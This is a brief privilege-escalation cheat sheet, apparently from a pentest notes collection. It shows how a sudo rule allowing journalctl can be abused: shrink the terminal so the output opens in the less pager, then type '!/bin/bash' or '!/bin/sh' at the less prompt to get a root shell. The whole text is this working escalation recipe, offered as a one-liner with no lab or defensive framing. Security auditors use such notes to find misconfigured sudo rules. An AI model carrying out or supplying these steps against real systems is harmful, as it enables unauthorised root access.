# journalctl sudo Escape (less)

`journalctl` pipes output to `less` when output exceeds terminal height. If running via `sudo`, shell escapes from less.

```bash
# Check sudo
sudo -l  # journalctl allowed without password

# Shrink terminal to fewer lines than output
sudo journalctl -n5 -u<service>
# Inside less prompt:
!/bin/bash
```

**One-liner:** resize terminal to ~3 lines, run `sudo journalctl`, get root shell via `!/bin/sh`.
